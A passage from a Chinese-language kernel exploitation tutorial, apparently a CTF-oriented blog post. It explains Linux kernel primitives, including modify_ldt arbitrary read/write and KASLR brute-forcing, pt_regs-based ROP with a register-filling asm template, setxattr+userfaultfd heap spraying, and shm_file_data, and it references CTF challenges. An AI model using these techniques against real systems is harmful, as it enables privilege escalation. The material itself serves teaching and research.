<code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里会<strong>直接调用 copy_to_user 向用户地址空间拷贝数据</strong>，我们不难想到的是若是能够控制 ldt-&gt;entries 便能够完成内核的任意地址读，由此泄露出内核数据</p><h4 id="①-爆破内核-text-段地址与-page-offset-base"><a href="#①-爆破内核-text-段地址与-page-offset-base" class="headerlink" title="① 爆破内核 .text 段地址与 page_offset_base"></a>① 爆破内核 .text 段地址与 page_offset_base</h4><p>前面讲到若是能够控制 ldt-&gt;entries 便能够完成内核的任意地址读 ，但在开启 KASLR 的情况下，我们并不知道该从哪里读取什么数据</p><p>这里我们要用到 <code>copy_to_user</code> 的一个特性：对于非法地址，其<strong>并不会造成 kernel panic，只会返回一个非零的错误码</strong>，我们不难想到的是，我们可以多次修改 ldt-&gt;entries 并多次调用 modify_ldt() 以<strong>爆破内核 .text 段地址与 page_offset_base</strong>，若是成功命中，则 modify_ldt 会返回给我们一个非负值</p><h4 id="②-利用-fork-完成-hardened-usercopy-下的任意地址读"><a href="#②-利用-fork-完成-hardened-usercopy-下的任意地址读" class="headerlink" title="② 利用 fork 完成 hardened usercopy 下的任意地址读"></a>② 利用 fork 完成 hardened usercopy 下的任意地址读</h4><p>当内核开启了 hardened usercopy 时，我们不能够直接搜索整个线性映射区域，这因为这有可能触发 hardened usercopy 的检查</p><p>ldt 是一个与进程全局相关的东西，因此现在让我们将目光放到与进程相关的其他方面上——观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>，因此不会触发 hardened usercopy 的检查，我们只需要在父进程中设定好搜索的地址之后再开子进程来用 read_ldt() 读取数据即可</p><h3 id="任意地址写：modify-ldt-系统调用——write-ldt"><a href="#任意地址写：modify-ldt-系统调用——write-ldt" class="headerlink" title="任意地址写：modify_ldt 系统调用——write_ldt()"></a>任意地址写：modify_ldt 系统调用——write_ldt()</h3><p>现在让我们将目光放到 modify_ldt 系统调用中的 <code>write_ldt()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 我们可以看到的是，在 memcpy 时所拷贝的字节数为 <code>old_ldt-&gt;nr_entries * LDT_ENTRY_SIZE</code>，其中前者的上限值与后者都定义于 <code>arch/x86/include/uapi/asm/ldt.h</code> 中，如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure><p> 那么这个数据量相对较大，拷贝需要用到一定的时间，而在拷贝结束后有一句 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code>，其中 ldt 为我们传入的数据，我们不难想到的是<strong>可以通过条件竞争的方式在 memcpy 过程中将 new_ldt-&gt;entries 更改为我们的目标地址从而完成任意地址写</strong>，即 double fetch </p><h1 id="0x04-pt-regs-与系统调用相关"><a href="#0x04-pt-regs-与系统调用相关" class="headerlink" title="0x04.pt_regs 与系统调用相关"></a>0x04.pt_regs 与系统调用相关</h1><p>严格意义上而言，<code>pt_regs</code> 并非是通过 slub 分配而来的一个结构体，而是<strong>固定位于内核栈底的一个结构体</strong>，由于其上的数据对我们而言是部分可控的，因此该结构体在内核利用当中也能发挥相当的作用</p><h2 id="系统调用部分过程-与-pt-regs-结构体"><a href="#系统调用部分过程-与-pt-regs-结构体" class="headerlink" title="系统调用部分过程 与 pt_regs 结构体"></a>系统调用部分过程 与 pt_regs 结构体</h2><p>系统调用的本质是什么？或许不少人都能够答得上来是由我们在用户态布置好相应的参数后执行 <code>syscall</code> 这一汇编指令，通过门结构进入到内核中的 <code>entry_SYSCALL_64</code>这一函数，随后通过系统调用表跳转到对应的函数</p><p>现在让我们将目光放到 <code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，观察，我们不难发现其有着<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">这样一条指令</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure><p>这是一条十分有趣的指令，它会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底：</p><p><a href="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png"><img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" alt="image.png"></a></p><p>该结构体的<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">定义</a>如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="内核栈-与-通用-ROP"><a href="#内核栈-与-通用-ROP" class="headerlink" title="内核栈 与 通用 ROP"></a>内核栈 与 通用 ROP</h2><p>我们都知道，内核栈<strong>只有一个页面的大小</strong>，而 pt_regs 结构体则固定位于<strong>内核栈栈底</strong>，当我们劫持内核结构体中的某个函数指针时（例如 seq_operations-&gt;start），在我们通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p><p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，<strong>这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：</strong></p><ul><li><strong>只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 便能够完成 ROP</strong></li></ul><blockquote><p>这是一个方便进行调试的板子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></blockquote><p>例题：<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B-easykernel">西湖论剑 2021 线上初赛 - easykernel</a></p><h3 id="新版本内核对抗利用-pt-regs-进行攻击的办法"><a href="#新版本内核对抗利用-pt-regs-进行攻击的办法" class="headerlink" title="新版本内核对抗利用 pt_regs 进行攻击的办法"></a>新版本内核对抗利用 pt_regs 进行攻击的办法</h3><p>正所谓魔高一尺道高一丈，内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">这个 commit</a> 中为系统调用栈<strong>添加了一个偏移值，这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span></span><br><span class="line"><span class="comment">--- a/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="meta">@@ -38,6 +38,7 @@</span></span><br><span class="line"> #ifdef CONFIG_X86_64</span><br><span class="line"> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+add_random_kstack_offset();</span></span><br><span class="line"> nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"> </span><br><span class="line"> instrumentation_begin();</span><br></pre></td></tr></table></figure><p>当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 slide gadget 来继续完成利用，不过稳定性也大幅下降了， <em>可以说这种利用方式基本上是废了</em></p><h1 id="0x05-setxattr-相关"><a href="#0x05-setxattr-相关" class="headerlink" title="0x05.setxattr 相关"></a>0x05.setxattr 相关</h1><p><strong>setxattr</strong> 并非一个内核结构体，而是一个系统调用，但在 kernel pwn 当中这同样是一个十分有用的系统调用，利用这个系统调用，我们可以进行内核空间中任意大小的 object 的分配，<strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p><h2 id="任意大小-object-分配（GFP-KERNEL）-amp-释放"><a href="#任意大小-object-分配（GFP-KERNEL）-amp-释放" class="headerlink" title="任意大小 object 分配（GFP_KERNEL）&amp; 释放"></a>任意大小 object 分配（GFP_KERNEL）&amp; 释放</h2><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong></p><h2 id="setxattr-userfaultfd-堆占位技术"><a href="#setxattr-userfaultfd-堆占位技术" class="headerlink" title="setxattr + userfaultfd 堆占位技术"></a>setxattr + userfaultfd 堆占位技术</h2><p>但是该 object 在 setxattr 执行结束时又会被放回 freelist 中，设想若是我们需要劫持该 object 的前 8 字节，那将前功尽弃</p><p>重新考虑 setxattr 的执行流程，其中会调用 <code>copy_from_user</code> 从用户空间拷贝数据，那么让我们考虑如下场景：</p><p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行<strong>跨页面的拷贝</strong>，当 copy_from_user 拷贝到第二个页面时<strong>便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</strong></p><p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" alt="image.png"></p><p>这便是 setxattr + userfaultfd 结合的堆占位技术（例题：<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E4%BE%8B%E9%A2%98%EF%BC%9ASECCON-2020-kstack">SECCON 2020 kstack</a>）</p><h1 id="0x06-shm-file-data-与共享内存相关"><a href="#0x06-shm-file-data-与共享内存相关" class="headerlink" title="0x06.shm_file_data 与共享内存相关"></a>0x06.shm_file_data 与共享内存相关</h1><p><strong>进程间通信</strong>（Inter-Process Communication，IPC）即不同进程间的数据传递问题，在 Linux 当中有一种 IPC 技术名为<strong>共享内存</strong>，在用户态中我们可以通过 <code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code> 这四个系统调用操纵共享内存</p><h2 id="shm-file-data（kmalloc-32-GFP-KERNEL）"><a href="#shm-file-data（kmalloc-32-GFP-KERNEL）" class="headerlink" title="shm_file_data（kmalloc-32|GFP_KERNEL）"></a>shm_file_data（kmalloc-32|GFP_KERNEL）</h2><p>该结构体定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="分配：shmat-系统调用"><a href="#分配：shmat-系统调用" class="headerlink" title="分配：shmat 系统调用"></a>分配：shmat 系统调用</h3><p>我们知道使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间，在该系统调用中调用了 <code>do_shmat()</code> 函数，注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure><p>即在调用 <code>shmat</code> 系统调用时会创建一个 <code>shm_file_data</code> 结构体，最后会存放在共享内存对象文件的 private_data 域中</p><h3 id="释放：shmdt-系统调用"><a href="#释放：shmdt-系统调用" class="headerlink" title="释放：shmdt 系统调用"></a>释放：shmdt 系统调用</h3><p>我们知道使用 <code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure><p>其中有着这样一条代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure><p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span 